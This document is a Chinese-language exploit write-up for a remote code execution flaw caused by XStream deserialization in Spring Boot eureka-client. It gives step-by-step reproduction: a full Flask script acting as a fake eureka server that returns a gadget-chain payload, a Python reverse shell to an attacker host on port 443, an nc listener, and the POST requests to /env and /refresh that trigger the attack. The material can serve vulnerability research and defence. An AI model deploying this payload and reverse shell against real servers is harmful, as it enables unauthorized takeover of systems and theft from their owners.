<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Spring Boot eureka xstream deserialization rce</h1><h2>一、漏洞简介</h2><h4><em>利用条件：</em></h4><ul><li>可以 POST 请求目标网站的 /env 接口设置属性</li><li>可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖）</li><li>目标使用的 eureka-client &lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h4><em>漏洞分析</em></h4><ol class="pydocx-list-style-type-decimal"><li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li><li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li><li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li></ol><h3>漏洞复现</h3><h5>步骤一：架设响应恶意 XStream payload 的网站</h5><p>提供一个依赖 Flask 并符合要求的python，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p><p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><p>springboot-xstream-rce.py</p><p>#!/usr/bin/env python<br /># coding: utf-8<br /># -**- Author: LandGrey -**-<br /><br />from flask import Flask, Response<br /><br />app = Flask(__name__)<br /><br /><br />@app.route('/', defaults={'path': ''})<br />@app.route('/&lt;path:path&gt;', methods=['GET', 'POST'])<br />def catch_all(path):<br />    xml = """&lt;linked-hash-set&gt;<br />  &lt;jdk.nashorn.internal.objects.NativeString&gt;<br />    &lt;value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"&gt;<br />      &lt;dataHandler&gt;<br />        &lt;dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"&gt;<br />          &lt;is class="javax.crypto.CipherInputStream"&gt;<br />            &lt;cipher class="javax.crypto.NullCipher"&gt;<br />              &lt;serviceIterator class="javax.imageio.spi.FilterIterator"&gt;<br />                &lt;iter class="javax.imageio.spi.FilterIterator"&gt;<br />                  &lt;iter class="java.util.Collections$EmptyIterator"/&gt;<br />                  &lt;next class="java.lang.ProcessBuilder"&gt;<br />                    &lt;command&gt;<br />                       &lt;string&gt;/bin/bash&lt;/string&gt;<br />                       &lt;string&gt;-c&lt;/string&gt;<br />                       &lt;string&gt;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);'&lt;/string&gt;<br />                    &lt;/command&gt;<br />                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;<br />                  &lt;/next&gt;<br />                &lt;/iter&gt;<br />                &lt;filter class="javax.imageio.ImageIO$ContainsFilter"&gt;<br />                  &lt;method&gt;<br />                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;<br />                    &lt;name&gt;start&lt;/name&gt;<br />                    &lt;parameter-types/&gt;<br />                  &lt;/method&gt;<br />                  &lt;name&gt;foo&lt;/name&gt;<br />                &lt;/filter&gt;<br />                &lt;next class="string"&gt;foo&lt;/next&gt;<br />              &lt;/serviceIterator&gt;<br />              &lt;lock/&gt;<br />            &lt;/cipher&gt;<br />            &lt;input class="java.lang.ProcessBuilder$NullInputStream"/&gt;<br />            &lt;ibuffer&gt;&lt;/ibuffer&gt;<br />          &lt;/is&gt;<br />        &lt;/dataSource&gt;<br />      &lt;/dataHandler&gt;<br />    &lt;/value&gt;<br />  &lt;/jdk.nashorn.internal.objects.NativeString&gt;<br />&lt;/linked-hash-set&gt;"""<br />    return Response(xml, mimetype='application/xml')<br /><br /><br />if __name__ == "__main__":<br />    app.run(host='0.0.0.0', port=80)</p><h5>步骤二：监听反弹 shell 的端口</h5><p>一般使用 nc 监听端口，等待反弹 shell</p><p>nc -lvp 443</p><h5>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</h5><p>spring 1.x</p><p>POST /env<br />Content-Type: application/x-www-form-urlencoded<br /><br />eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</p><p>spring 2.x</p><p>POST /actuator/env<br />Content-Type: application/json<br /><br />{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}</p><h5>步骤四：刷新配置</h5><p>spring 1.x</p><p>POST /refresh<br />Content-Type: application/x-www-form-urlencoded</p><p>spring 2.x</p><p>POST /actuator/refresh<br />Content-Type: application/json</p></body></html>